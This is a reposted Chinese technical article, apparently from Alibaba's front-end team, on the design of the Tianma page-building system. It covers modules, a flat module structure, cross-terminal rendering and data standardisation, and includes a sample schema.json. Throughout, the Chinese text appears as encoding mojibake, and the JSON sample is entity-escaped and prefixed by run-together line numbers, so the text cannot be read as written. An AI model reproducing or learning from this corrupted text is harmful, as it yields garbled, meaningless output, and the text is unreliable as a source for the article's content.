    <content type="text"><![CDATA[è½¬è½½è‡ª Alibaba F2Eï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/nMcgc1Gaj7NU0vOY399nYg æ­å»ºåœ¨äº’è”ç½‘æŠ€æœ¯é¢†åŸŸç®—æ˜¯ä¸€ä¸ªéå¸¸å®½æ³›çš„æ¦‚å¿µï¼Œä»æ—©æœŸå¤§éƒ¨åˆ†äººéƒ½æœ‰æ¥è§¦è¿‡çš„ wordpress ä¸ªäººç½‘ç«™æ­å»ºï¼Œåˆ°ä¸€äº›æ–‡ç« ç±» CMS ç³»ç»Ÿçš„å›¾æ–‡ç¼–æ’æ­å»ºï¼Œå†åˆ°æ›´å¤æ‚çš„ UI æ­å»ºï¼Œç‰¹åˆ«æ˜¯ React/Vue å‡ºç°åï¼Œä»æ¡†æ¶å±‚é¢ä¹Ÿæä¾›äº†å¾ˆå¤šåŒ…æ‹¬è§†å›¾ç»“æ„åŒ–ï¼ˆvdomï¼‰ï¼Œè§†å›¾å’Œæ•°æ®å…³è”ï¼ˆæ•°æ®ç»‘å®šï¼‰ç­‰ç­‰èƒ½åŠ›ï¼ŒæŠŠåŸæœ¬éå¸¸å¤æ‚çš„æ­å»ºç”»å¸ƒè¿›è¡Œäº†ç®€åŒ–ã€‚ åœ¨æ·˜å®ï¼Œ2008å¹´çš„æ—¶å€™å°±å·²ç»æœ‰äº†ç¬¬ä¸€ä¸ªæ­å»ºç³»ç»Ÿ TMSï¼ˆTemplate Management Systemï¼‰ï¼Œå½“æ—¶çš„è®¾è®¡ä¹Ÿéå¸¸å¤§åœ°å½±å“äº†æ¥ä¸‹æ¥åå‡ å¹´çš„æ­å»ºä½“ç³»è®¾è®¡ã€‚ è¿™äº›è®¾è®¡åŒ…æ‹¬äº†ï¼š å‰ç«¯æ“ä½œå’Œè¿è¥æ“ä½œåˆ†ç¦» åŸºäºæ¨¡æ¿çš„æ•°æ®æŒ–å‘ é¡µé¢æ¸²æŸ“çš„æŠ½è±¡ ä»ä¸Šé¢çš„é¡µé¢æŠ½è±¡çœ‹ï¼Œè¿˜æ˜¯æœ‰éå¸¸å¤š PC æ—¶ä»£çš„å½±å­ï¼Œéšç€å…¬å¸çš„æˆ˜ç•¥è°ƒæ•´ï¼Œæ— çº¿åŒ–ã€ä¸ªæ€§åŒ–çš„å‘å±•ï¼Œæ­å»ºç³»ç»Ÿä¹Ÿéšç€ä¸€èµ·æ‹¥æŠ±å˜åŒ–ï¼Œè¡ç”Ÿå‡ºäº†å„ä¸ªé¢å‘ä¸åŒåœºæ™¯ã€è¯‰æ±‚çš„æ­å»ºåº”ç”¨ï¼ŒèƒŒåå¿…ç„¶ä¹Ÿæ„å‘³ç€éå¸¸å¤šçš„é‡å¤å»ºè®¾ã€‚åœ¨2019å¹´ï¼Œéšç€æ·˜å®ã€å¤©çŒ«æŠ€æœ¯éƒ¨çš„åˆå¹¶ï¼Œæœ€ç»ˆåœ¨é˜¿é‡Œå‰ç«¯å§”å‘˜ä¼šçš„æ”¯æŒä¸‹ï¼Œå¯åŠ¨äº†æ­å»ºæŠ€æœ¯æ–¹å‘ï¼Œä»å‡å°‘é‡å¤å»ºè®¾ï¼Œæå‡ä¸šåŠ¡äº’é€šçš„è§’åº¦ï¼Œè¿›è¡Œæ­å»ºåº”ç”¨/æœåŠ¡åˆ†å±‚çš„æŠ½è±¡ï¼Œå¤©é©¬ä¹Ÿä½œä¸ºç»æµä½“æ­å»ºåŸŸçš„ç»Ÿä¸€æœåŠ¡ï¼Œç„¶åå„ä¸ª BUã€ä¸šåŠ¡éƒ½å¯ä»¥åŸºäºç»Ÿä¸€çš„æœåŠ¡å’Œè§„èŒƒï¼Œå»ºè®¾è´´åˆè‡ªå·±ä¸šåŠ¡çš„æ­å»ºç³»ç»Ÿã€‚ å¤©é©¬åœ¨ä¸Šä¸ªè´¢å¹´å®Œæˆäº†åå‡ ä¸ª BU çš„æ¥å…¥å’Œæ­å»ºæ”¯æŒï¼Œæ•´ä½“äº§å‡ºäº†ä¸Šä¸‡ä¸ªæ¨¡å—ï¼Œå‘å¸ƒäº†ä¸Šç™¾ä¸‡å¼ é¡µé¢ï¼Œè¦†ç›–äº†3ä¸‡+é˜¿é‡Œè¿è¥åŠå‡ åä¸‡çš„å•†å®¶ã€‚ **** æ­å»ºçš„åè¯ä¸æ¦‚å¿µ æ­å»ºæ˜¯ä¸€ä¸ªå¤šè§’è‰²å¤åˆå‚ä¸çš„æµç¨‹ï¼Œè¿™æ˜¯æ­å»ºå’Œå…¶ä»–æŠ€æœ¯æ–¹å‘å·®å¼‚æ¯”è¾ƒå¤§çš„åœ°æ–¹ã€‚æ‰€ä»¥è®¾è®¡æ­å»ºçš„æ—¶å€™ï¼Œéœ€è¦å…ˆæ˜ç¡®é‡ç‚¹ç”¨æˆ·æ˜¯è°ï¼Œéœ€è¦å›´ç»•ä»€ä¹ˆè§’è‰²æ¥è®¾è®¡æµç¨‹ã€‚ ä¸ºäº†å¸®åŠ©å¤§å®¶èƒ½å¤Ÿæ›´å¥½åœ°ç†è§£åé¢çš„å†…å®¹ï¼Œé¦–å…ˆæŠŠä¸€äº›åè¯åšä¸€ä¸‹å¯¹é½ï¼š æ¨¡å—ï¼šéæŠ€æœ¯åŒå­¦æ­å»ºé¡µé¢ä¾èµ–çš„æœ€å°å•ä½ é¡µé¢æ­å»ºï¼šä»æ¨¡å—åˆ°é¡µé¢çš„ç»„åˆè¿‡ç¨‹ æ•°æ®æŠ•æ”¾ï¼šæ•°æ®çš„å˜åŒ–é¢‘ç‡è¿œé«˜äºé¡µé¢ï¼Œæ‰€ä»¥å•ç‹¬æå–å‡ºæ•°æ®æŠ•æ”¾çš„æ¦‚å¿µ ç»ˆç«¯ï¼šç›®æ ‡è¿è¡Œç¯å¢ƒ æ­å»ºçš„è®¾è®¡ æµç¨‹è®¾è®¡ æ— è®ºåœ¨å‡ å¹´å‰çš„ PC æ—¶ä»£ï¼Œè¿˜æ˜¯ç°åœ¨çš„æ— çº¿æ—¶ä»£ï¼Œä¸šåŠ¡çš„è¿ä½œæ˜¯ç¦»ä¸å¼€çº·ç¹å¤æ‚çš„é¡µé¢åˆ¶ä½œçš„ï¼Œæ¯”å¦‚æ·˜å®ï¼Œä»æ—©æœŸä¸åŒçš„è¡Œä¸šç±»ç›®ï¼Œåˆ°ç°åœ¨çš„ä¸åŒçš„å¯¼è´­è¥é”€æ–¹å¼ï¼ŒèƒŒåéƒ½æ˜¯éœ€è¦åˆ¶ä½œå¤§é‡çš„é¡µé¢æ”¯æ’‘ã€‚ æ•´ä¸ªé¡µé¢åˆ¶ä½œè¿‡ç¨‹ï¼Œç»è¿‡æŠ½è±¡ã€‚ä¸»è¦æ˜¯åŒ…å«å‡ ä¸ªæ­¥éª¤ï¼š è¿™äº›æ­¥éª¤åº”è¯¥æ˜¯å¯ä»¥ç”±è¿è¥ç‹¬ç«‹å®Œæˆï¼Œä¸éœ€è¦ç ”å‘åŒå­¦ä»‹å…¥çš„ã€‚é‡ç‚¹è®²ä¸‹è®¾ç½®ã€æ­å»ºã€æŠ•æ”¾ä¸‰ä¸ªæ­¥éª¤ã€‚ è®¾ç½®é¡µé¢ï¼šé¡µé¢æ ‡é¢˜ã€keywordsã€description ä¹‹ç±»çš„å¯èƒ½ä¼šå½±å“åˆ° html æ–‡æ¡£ç›´æ¥å˜åŒ–çš„è®¾ç½® æ­å»ºé¡µé¢ï¼šé¡µé¢ç»“æ„çš„è°ƒæ•´ï¼Œæ·»åŠ æ¨¡å—ã€åˆ é™¤æ¨¡å—ã€äº¤äº’æ¨¡å—ä½ç½®ç­‰ç­‰ æŠ•æ”¾æ•°æ®ï¼šé’ˆå¯¹å•ä¸ªã€å¤šä¸ªæ¨¡å—è¿›è¡Œæ•°æ®è®¾ç½® è¿™äº›èƒ½åŠ›èƒŒåå°±æ˜¯å¯¹é¡µé¢ã€æ¨¡å—ã€æ•°æ®çš„æŠ½è±¡æ–¹å¼ï¼Œå†³å®šäº†ä¸€ä¸ªæ­å»ºçš„ç‰©æ–™åº”è¯¥å¦‚ä½•è®¾è®¡ã€‚ å½“ç„¶è¿™äº›æµç¨‹åªæ˜¯ä¸€ä¸ªé¡ºåºï¼Œä¸ä»£è¡¨è¿™äº›æ“ä½œå¿…é¡»äººå·¥è¿›è¡Œï¼Œå³ä½¿æ˜¯è‡ªåŠ¨åŒ–ç”Ÿäº§å’Œæ­å»ºé¡µé¢ï¼ŒèƒŒåç³»ç»Ÿçš„æµç¨‹ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚ æ­å»ºæ ¸å¿ƒç‰©æ–™-æ¨¡å— æ¨¡å—æ˜¯å¤©é©¬å®šä¹‰çš„é¡µé¢æ­å»ºæœ€å°å•ä½ï¼Œé¡µé¢ç”±æ¨¡å—ç»„æˆï¼Œæ¨¡å—å¯ä»¥å’Œæ•°æ®è¿›è¡Œå…³è”ã€‚ å¤©é©¬çš„æ­å»ºæ¨¡å—æœ‰å‡ ä¸ªæ ¸å¿ƒçš„è®¾è®¡åŸåˆ™ï¼š æ‰å¹³åŒ– è·¨ç»ˆç«¯ é¢å‘æ ‡å‡†æ•°æ®ç ”å‘ æ‰å¹³åŒ– åœ¨å‰é¢ä»‹ç» TMS çš„æ—¶å€™ï¼Œæœ‰ä»‹ç» TMS æ˜¯å¦‚ä½•è®¾è®¡é¡µé¢æ¸²æŸ“çš„ï¼Œé™¤äº†ä¸Šä¸‹æ¨¡å—æ­å»ºä¹‹å¤–ï¼Œè¿˜æä¾›äº†æ¨ªå‘çš„æ¨¡å—æ­å»ºèƒ½åŠ›ï¼Œå½“æ—¶ä¹Ÿå«åšæ …æ ¼æ¨¡å—ã€‚ ä½†å¤©é©¬å¯¹è¿™éƒ¨åˆ†è¿›è¡Œäº†ç®€åŒ–ï¼Œåªæ”¯æŒäº†ä»ä¸Šåˆ°ä¸‹ç§¯æœ¨å¼æ­å»ºçš„èƒ½åŠ›ï¼Œä¹Ÿå°±æ˜¯ä¸€ç»´æ‰å¹³çš„æ¨¡å—ç»“æ„ã€‚ ç§¯æœ¨å¼æ­å»º å¯¹åº”åˆ°é¡µé¢å°±æ˜¯å¦‚ä¸‹å›¾ï¼š ä¸ºä»€ä¹ˆå¯¹è¿™éƒ¨åˆ†è¿›è¡Œç®€åŒ–å‘¢ï¼Ÿ å¯¹è¿è¥å‹å¥½ï¼šä»è¿è¥åŒå­¦ä½œä¸ºæ­å»ºä¸»è¦ç”¨æˆ·çš„è§’åº¦æ¥æ€è€ƒï¼Œä»¥åŠæ— çº¿åŒ–åœºæ™¯ä¸‹ï¼Œæ‰‹æœºå±å¹•çš„ç‰¹å¾ï¼Œä¸€ç»´å­˜å‚¨çš„æ¨¡å—åˆ—è¡¨æ˜¯æ¯”è¾ƒå‹å¥½çš„ã€‚è¿™ä¸ªè®¾è®¡ä¹Ÿå¯¹æ­å»ºæœåŠ¡æœ¬èº«å¸¦æ¥äº†å¾ˆå¤§çš„ç®€åŒ–ï¼Œæ•´ä¸ªé¡µé¢ç»“æ„å°±æ˜¯ä¸€ç»´æ•°ç»„ï¼Œæ¯æ¬¡æ“ä½œéƒ½å¯ä»¥è½¬å˜æˆä¸€æ¬¡ç®€å•çš„æ•°ç»„æ“ä½œã€‚å½“ç„¶ï¼Œä¸€ç»´çš„å­˜å‚¨ä¸ä»£è¡¨ä¸€ç»´çš„å±•ç¤ºï¼Œå¼€å‘è€…ä¾ç„¶å¯ä»¥åœ¨å±•ç¤ºçš„æ—¶å€™ï¼Œé€šè¿‡ä¸€äº›çˆ¶å­å…³ç³»ï¼Œæ¥æŠŠä¸€ç»´çš„å­˜å‚¨ç»“æ„è½¬å˜ä¸ºæ ‘çŠ¶ç»“æ„ã€‚ç›®å‰æˆ‘ä»¬æ˜¯åˆ¤æ–­æŠŠå¤æ‚åº¦ç»™å¼€å‘è€…ï¼Œç®€å•çš„æ“ä½œç»™åˆ°éæŠ€æœ¯åŒå­¦ï¼Œè¿˜æ˜¯ä¸€ä¸ªæ¯”è¾ƒåˆé€‚çš„æ–¹å¼ã€‚ æ–¹ä¾¿å»ºç«‹å¤šç«¯å¯¹åº”å…³ç³»ï¼šå› ä¸ºæ— çº¿åŒ–ï¼Œå…¬å¸åœ¨æ— çº¿ä¸Šçš„æŠ•å…¥æ¯”æ¡Œé¢ç«¯å¤§å¾ˆå¤šï¼ˆä¸»è¦æ˜¯æ¶ˆè´¹è€…ä¾§ï¼‰ï¼Œé‚£ä¹ˆå¦‚æœèƒ½æ­å»ºæ— çº¿é¡µé¢ï¼Œç„¶åæ¡Œé¢ç«¯è‡ªåŠ¨ç”Ÿæˆï¼Œæˆ–è€…åä¸€ä¸‹ï¼Œå¯¹æ­å»ºç”¨æˆ·æ¥è¯´å¯ä»¥çœæ‰å¾ˆå¤šæ—¶é—´ã€‚ç‰¹åˆ«æ˜¯å½“ä¸‹æç«¯ä¸€äº›çš„åœºæ™¯ï¼Œç”¨æˆ·æ­å»ºä¸€ä¸ªæ— çº¿ç«¯é¡µé¢ï¼Œéœ€è¦åŒæ—¶é¢å¤–ç”Ÿæˆ pcã€weexã€å°ç¨‹åºçš„ç‰ˆæœ¬ã€‚ä¸€ç»´å­˜å‚¨çš„æ¨¡å—ç»“æ„å¯ä»¥è¾ƒå¥½åœ°å»ºç«‹ä¸åŒç»ˆç«¯é¡µé¢æ¨¡å—çš„å¯¹åº”å…³ç³»ã€‚ æ–¹ä¾¿å»ºç«‹æœåŠ¡ç«¯ä¸æ¨¡å—çš„å…³ç³»ï¼šå› ä¸ºç®—æ³•çš„æ™®åŠï¼Œé¡µé¢çš„ä¸ªæ€§åŒ–ä¸å±€é™äºæŸä¸ªå•†å“æ¨¡å—å†…éƒ¨ï¼Œè€Œæ˜¯ä¸åŒäººç¾¤è®¿é—®åŒä¸ªé¡µé¢ï¼Œæ•´ä¸ªé¡µé¢çš„é¡ºåºéƒ½æœ‰å¯èƒ½å› ä¸ºä¸ªæ€§åŒ–è€Œè°ƒæ•´ã€‚é‚£ä¹ˆå¯¹äºåç«¯ç®—æ³•æ¥è¯´ï¼Œå°±éœ€è¦æ„ŸçŸ¥åˆ°é¡µé¢ç»“æ„ï¼Œå¹¶å’Œåç«¯çš„ç®—æ³•æ¨¡å‹è¿›è¡Œå…³è”ã€‚ä¸€ç»´çš„ç»“æ„å¯¹äºè¿™éƒ¨åˆ†è¿˜æ˜¯éå¸¸å‹å¥½çš„ è·¨ç»ˆç«¯ æœ€æ—©åœ¨12å¹´çš„æ—¶å€™ï¼Œå¤©çŒ«å°±å·²ç»æœ‰äº†è·¨ç»ˆç«¯çš„æ¦‚å¿µã€‚å¦‚å‰é¢çš„æ¦‚å¿µå®šä¹‰ï¼Œè¿™é‡Œä¸ä¸¥æ ¼å®šä¹‰æ¥åŒºåˆ†ç»ˆç«¯ã€å®¹å™¨ç­‰ç­‰ï¼Œå…ˆç”¨æ¯”è¾ƒç®€å•çš„æ¦‚å¿µï¼Œç§°ä¸ºç»ˆç«¯ï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡çš„è¿è¡Œç¯å¢ƒã€‚ç»ˆç«¯åŒ…æ‹¬æ¡Œé¢ç‰ˆ chromeã€ç§»åŠ¨ç«¯ safariã€tvç›’å­çš„ UC æµè§ˆå™¨ã€æ‰‹æœºæ·˜å®çš„ webview/weex å®¹å™¨ã€æ”¯ä»˜å®å°ç¨‹åºå®¹å™¨ç”šè‡³åˆ°æœåŠ¡ç«¯çš„ ssr æ¸²æŸ“å¼•æ“ç­‰ç­‰ã€‚ ä¸ºä»€ä¹ˆä¸ç”¨å“åº”å¼ï¼Ÿå“åº”å¼åªæ˜¯è·¨ç»ˆç«¯çš„ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œå“åº”å¼è§£å†³ä¸äº†ä»£ç è¿è¡Œåœ¨æœåŠ¡ç«¯çš„é—®é¢˜ï¼Œå¹¶ä¸”å“åº”å¼æœ¬èº«ä¹Ÿè¿‡äºæ³¨é‡æ•ˆç‡ï¼Œè€Œä¸æ˜¯å»é¢å¯¹æœ¬è´¨ä¸Šçš„å·®å¼‚ã€‚ æ¡Œé¢ç«¯ç«¯å¯¼èˆªæ¨¡å— æ— çº¿ç«¯å¯¼èˆªæ¨¡å— æ¯”å¦‚å›¾é‡Œçš„å¯¼èˆªæ¨¡å—ï¼Œæ— çº¿ç«¯æ˜¯ä¸€ä¸ª tab ï¼Œè€Œåœ¨æ¡Œé¢ç«¯æ˜¯ä¸€ä¸ªéšå±æ»šåŠ¨ä¸”æ‚¬æµ®çš„æ¨¡å—ï¼Œè¿™æ˜¯ä¸€ä¸ªäº¤äº’å·®å¼‚çš„æ¡ˆä¾‹ï¼Œè€Œå®é™…ä¸Šï¼Œæ›´å¤šè¿˜æœ‰å†…å®¹ã€ä¸šåŠ¡é€»è¾‘ä¸Šçš„å·®å¼‚ï¼Œæ‰€ä»¥ä¸å¿…æ‹˜æ³¥äºå“åº”å¼ï¼Œè¯¥å†™ä¸¤å¥—é€»è¾‘å°±å†™ã€‚ å½“ç„¶ï¼Œè·¨ç»ˆç«¯æ˜¯æ¨¡å—çš„èƒ½åŠ›ï¼Œå¦‚æœæˆ‘çš„æ¨¡å—å°±æ˜¯åªé¢å‘ä¸€ä¸ªç«¯æœåŠ¡ï¼Œå°±å¯ä»¥åªå†™ä¸€ä¸ªç«¯ã€‚ å®é™…çš„æƒ…å†µä¼šæ›´å¤æ‚ä¸€äº›ï¼Œç›®å‰æ·˜ç³»é€‰æ‹©äº† Rax ä½œä¸ºç»Ÿä¸€ DSLï¼ŒåŸºäºä¸Šé¢çš„æ­å»ºè®¾è®¡ï¼ŒåŠ ä¸Š Rax æœ¬èº«ä¸€æ¬¡å¼€å‘å¤šç«¯è¿è¡Œçš„èƒ½åŠ›ï¼Œå°±å¯ä»¥å®ç°æˆ‘åªéœ€è¦å†™ä¸€ä»½æ— çº¿ç«¯ web çš„ä»£ç ï¼Œåˆ†åˆ«è½¬å‡º weexã€å°ç¨‹åºçš„ç‰ˆæœ¬ï¼Œè¿™æ ·æˆ‘çš„æ¨¡å—æŠ•æ”¾åˆ° webview é‡Œå°±æ˜¯ web æ¨¡å¼ï¼ŒæŠ•æ”¾åˆ°å°ç¨‹åºé‡Œå°±æ˜¯åŸç”Ÿå°ç¨‹åºï¼ŒæŠ•æ”¾åˆ° weex å°±å¯ä»¥ä»¥ weex å½¢å¼æ¸²æŸ“ã€‚æ‰€ä»¥ä¸€ä¸ªæ¨¡å—å‘å¸ƒåï¼Œä¼šåŒæ—¶åŒæ­¥åˆ° CDN å’Œ npm ä¸Šï¼ŒCDN ç‰ˆæœ¬ç»™åˆ°çº¯æµè§ˆå™¨å’ŒæœåŠ¡ç«¯ä½¿ç”¨ï¼Œtnpm éƒ¨åˆ†ç»™åˆ°å°ç¨‹åºå’Œæºç é¡µé¢ç­‰å…¶ä»–æœ‰é¡µé¢çº§æ„å»ºèƒ½åŠ›çš„åœºæ™¯ä½¿ç”¨ã€‚ é¢å‘æ ‡å‡†æ•°æ®ç ”å‘ è¿™ä¸ªåŸåˆ™æ¯”è¾ƒå®¹æ˜“è®©äººå›°æ‰°ï¼Œä½†å®é™…ä¸Šï¼Œå¤§å®¶åœ¨æ—¥å¸¸ç ”å‘ä¸­ï¼Œæˆ–å¤šæˆ–å°‘éƒ½åœ¨åšç€ç›¸å…³çš„äº‹æƒ…ï¼Œæ¯”å¦‚å¦‚ä½•æ ¡éªŒä¸€ä¸ªè¡¨å•ï¼Œå¦‚ä½•å’Œåç«¯ä¸€èµ·å®šä¹‰ä¸€ä¸ªæ–°çš„æ•°æ®æ¥å£ï¼Œä»¥åŠç°åœ¨æ¯”è¾ƒæµè¡Œçš„ TypeScript ä¹Ÿæ˜¯åœ¨å®šä¹‰æ•°æ®æ ¼å¼ã€‚æˆ‘ä»¬æŠŠè¿™ä¸ªåŸåˆ™åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼š é¢å‘æ•°æ®ç ”å‘ æ•°æ®æ ‡å‡†åŒ– æ•°æ®æ ¼å¼å°±æ˜¯ä¸€ä¸ªç¬¦åˆ JSON schema è§„èŒƒçš„ schema.json æ•°æ®æè¿°ï¼Œæ¥æè¿°æ¨¡å—æ¥å—å“ªäº›å…¥å‚ï¼Œä¹Ÿå°±æ˜¯æ¨¡å—é¢å‘ä»€ä¹ˆæ•°æ®ç ”å‘ã€‚è¿™äº›å…¥å‚å†…éƒ¨ï¼Œä¹Ÿåšäº†æ›´å¤šçš„çº¦å®šï¼Œæ¯”å¦‚å¦‚ä½•è®©æ¨¡å—èƒ½å¤Ÿæ¢è‚¤ï¼ˆå’Œä¸­åå°æ¢è‚¤çš„æœºåˆ¶æœ‰æ¯”è¾ƒå¤§çš„å·®å¼‚ï¼‰ï¼Œå¦‚ä½•èƒ½å¤Ÿè®©æ¨¡å—èƒ½å¤Ÿæ¥å—ä¸€äº›é…ç½®ï¼Œä»¥åŠå¦‚ä½•ç»™æ¨¡å—ä¼ é€’æ ¸å¿ƒæ¸²æŸ“éœ€è¦çš„æ•°æ®ã€‚ è€Œæ ‡å‡†åŒ–çš„æ•°æ®æ ¼å¼é€šè¿‡å…ˆå®šä¹‰æ•°æ®æ¨¡å‹ï¼Œç„¶åæ¨¡å—å°½å¯èƒ½å»å¼•ç”¨å·²æœ‰çš„æ•°æ®æ¨¡å‹ï¼Œè§£å†³å¼€å‘è€…éƒ½æ˜¯å†™åŒä¸€ä¸ªå•†å“æ¨¡å—ï¼Œå­—æ®µå´ä¸åŒçš„é—®é¢˜ã€‚å¦åˆ™å¯¹äºåç«¯æ¥è¯´ï¼Œå¾—åšä¸€å¥—éå¸¸å¤æ‚çš„ç³»ç»Ÿæ¥æŠŠåŒæ ·çš„å•†å“æ•°æ®å¡åˆ°ä¸åŒçš„æ¨¡å—é‡Œï¼ŒåŒæ—¶è¿˜è¦é€‚é…å„ä¸ªæ¨¡å—ä¸åŒçš„å­—æ®µå®šä¹‰ã€‚é€šå¸¸åç«¯åŒå­¦ä¹Ÿä¸ä¼šæ„¿æ„åšè¿™ä¸ªäº‹æƒ…ã€‚ è¿™äº›è®¾è®¡èƒŒåä¹Ÿå°±æ˜¯æˆ‘ä»¬æœŸæœ›å¼€å‘è€…ç ”å‘æ¨¡å—æ—¶å°½é‡è„±ç¦»ä¸šåŠ¡åœºæ™¯ï¼Œå°½é‡å°‘çš„ä¸ç‰¹å®šçš„åç«¯æ¥å£äº¤äº’ï¼ŒæŠŠæ¨¡å—å†™çš„æ›´åƒä¸€ä¸ªçº¯åšæ¸²æŸ“çš„ç»„ä»¶ï¼Œè¿™æ ·æ¨¡å—çš„æµé€šèƒ½åŠ›æ‰èƒ½å¾—åˆ°ä¿éšœã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ª schema.json çš„æ¡ˆä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132&#123; &quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: &#123; &quot;$attr&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: &#123; &quot;hidden&quot;: &#123; &quot;type&quot;: &quot;boolean&quot; &#125; &#125; &#125;, &quot;$theme&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: &#123; &quot;themeColor&quot;: &#123; &quot;type&quot;: &quot;string&quot; &#125; &#125; &#125;, &quot;items&quot;: &#123; &quot;type&quot;: &quot;array&quot;, &quot;items&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: &#123; â€œitemIdâ€: &#123; &quot;type&quot;: &quot;string&quot; &#125; &#125; &#125; &#125; &#125;&#125; è€Œé‚£äº›å’Œä¸šåŠ¡åœºæ™¯ç›¸å…³çš„é€»è¾‘ï¼Œå°±æ”¾åˆ°é¡µé¢çº§å¤„ç†ï¼Œä¸åŒçš„é¡µé¢å¯ä»¥å…±äº«ä¸€å¥—é¡µé¢åˆå§‹åŒ–é€»è¾‘ã€‚ æ•°æ®æ ‡å‡†åŒ– ç»§ç»­å±•å¼€è®²é¢å‘æ ‡å‡†æ•°æ®ç ”å‘ï¼Œå› ä¸ºæ­å»ºæœ¬èº«çš„ç‰¹æ®Šæ€§ï¼Œä»¥åŠæ¨¡å—å¯¹åº”çš„æ•°æ®ä¸ä¼šåªæ˜¯ç®€å•çš„è¿›è¡Œè¡¨å•æŠ•æ”¾ï¼Œç‰¹åˆ«æ˜¯åœ¨åƒäººåƒé¢ã€ä¸ªæ€§åŒ–æ™®åŠçš„ä»Šå¤©ï¼Œå¤§éƒ¨åˆ†æ¨¡å—èƒŒåï¼Œä¸ä»…ä»…æ˜¯é™æ€æ•°æ®ï¼Œè€Œæ˜¯ä¸€äº›åŠ¨æ€æ•°æ®æœåŠ¡ï¼Œè¿™äº›æ¥å£å¯èƒ½ä¼šæ¥è‡ªäºå…¬å¸å¤§å¤§å°å°å„ç§ä¸åŒçš„ç³»ç»Ÿã€‚å¯¹äºæ¨¡å—å¼€å‘è€…è€Œè¨€ï¼Œæˆ‘å®šä¹‰çš„æ•°æ®æè¿°åº”è¯¥é¢å‘å“ªä¸ªæ¥å£ï¼ŸåŒæ ·éƒ½æ˜¯å•†å“æ¥å£ï¼ŒAåº”ç”¨å’ŒBåº”ç”¨æ¥å£è¿”å›çš„å­—æ®µï¼Œä¸€ä¸ªæ˜¯ä¸‹åˆ’çº¿é£æ ¼ï¼Œä¸€ä¸ªæ˜¯é©¼å³°æ€ä¹ˆåŠã€‚ æ•°æ®æ ‡å‡†åŒ–è§£å†³çš„å°±æ˜¯è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åº”è¯¥é¢å‘ä¸€ä¸ªæ ‡å‡†çš„æ•°æ®è¿›è¡Œç ”å‘ã€‚è¿™ä¸ªæ ‡å‡†æ•°æ®å°±æ˜¯åŸºäºç›®å‰æœ€åº•å±‚çš„è¿™äº›ç³»ç»Ÿï¼Œå•†å“åº“ã€ç”¨æˆ·åº“ç­‰ç­‰ï¼Œç»Ÿä¸€å‘½åè§„èŒƒåçš„ç»“æœã€‚å¤§å®¶éƒ½éµå®ˆè¿™ä¸ªè§„èŒƒæ¥ç»™æ¨¡å—ä¼ é€’æ•°æ®å°±å¯ä»¥äº†ã€‚ ä½†å®é™…æƒ…å†µæ¯”è¿™ä¸ªè¿˜è¦å¤æ‚ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ªæ¨¡å—ï¼Œæœ‰ä¸€è¡Œæ–‡å­—æè¿°ï¼Œéƒ¨åˆ†åœºæ™¯ä¸‹æ˜¾ç¤ºçš„æ˜¯å•†å“æ ‡é¢˜ï¼Œéƒ¨åˆ†åœºæ™¯ä¸‹æ˜¾ç¤ºçš„æ˜¯å•†å®¶å†™çš„å®£ä¼ æ–‡æ¡ˆï¼ŒUI æœ¬èº«æ˜¯æœ‰äºŒä¹‰æ€§çš„ã€‚è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬åœ¨æ•°æ®æè¿°é‡Œå°±ä¼šå®šä¹‰ä¸€ä¸ªå« title çš„å­—æ®µï¼Œå…·ä½“è¿™ä¸ª title å¯¹åº”å®é™…æ˜¯ itemTitle è¿˜æ˜¯ itemDescriptionï¼Œå°±è¦çœ‹å®é™…çš„åœºæ™¯ã€‚ æœ€åä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªé¢å‘æ­å»ºåŸŸçš„æ•°æ®æ¥å£ï¼Œç»™åˆ°å‰ç«¯æ¸²æŸ“å‰ï¼Œå®é™…å¯èƒ½ä¼šç»è¿‡ä¸¤æ¬¡æ ‡å‡†åŒ–ï¼Œä¸€æ¬¡é¢†åŸŸæ¨¡å‹çš„æ ‡å‡†åŒ–ï¼Œç¡®ä¿å­—æ®µæ˜¯æ²¡æœ‰äºŒä¹‰æ€§çš„ï¼Œç„¶åå†æ˜¯ä¸€æ¬¡VOçš„æ ‡å‡†åŒ–ï¼Œå†åŸºäºè§†å›¾çš„éœ€æ±‚ï¼Œæ˜ å°„åˆ°å¯èƒ½æœ‰äºŒä¹‰æ€§çš„æ¨¡å—å±•ç¤ºä¸Šã€‚ é€šå¸¸æˆ‘ä»¬ä¼šè¦æ±‚åç«¯åŒå­¦æ¥åšå¥½é¢†åŸŸæ¨¡å‹çš„æ ‡å‡†åŒ–ï¼Œç„¶åå‰ç«¯åœ¨ FaaS æˆ–è€…ç»´æŠ¤ä¸€ä¸ªç±»ä¼¼ç½‘å…³çš„åº”ç”¨è¿›è¡Œè§†å›¾æ¨¡å‹çš„æ ‡å‡†åŒ–ã€‚å½“ç„¶ä¹Ÿå¯ä»¥å‰ç«¯ç›´æ¥ä»æ•°æ®æºç›´æ¥æ˜ å°„åˆ° UI æ¨¡å‹ï¼Œåªæ˜¯æŠ½è±¡çš„å±‚æ¬¡ä¸åŒã€‚ å¦‚ä½•ç¼–å†™ä¸€ä¸ªæ¨¡å— å‰é¢æœ‰æåˆ°ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ¯”è¾ƒæ¨èæ¨¡å—åªæ˜¯åšæ¸²æŸ“ï¼Œå°½é‡å°‘çš„å’Œç‰¹å®šçš„åœºæ™¯ç»‘å®šã€‚é‚£ä¹ˆç®€åŒ–ä¸€ä¸‹æ¨¡å—å¼€å‘ï¼Œå°±æ˜¯ï¼š å®šä¹‰æˆ‘éœ€è¦ä»€ä¹ˆæ ¼å¼çš„æ•°æ® å‡†å¤‡å¥½ä¸€ä»½ mock æ•°æ® å†™ä¸€æ®µé€»è¾‘ï¼Œè¾“å…¥ mock æ•°æ®ï¼Œè¿”å›æ¸²æŸ“ç»“æœ 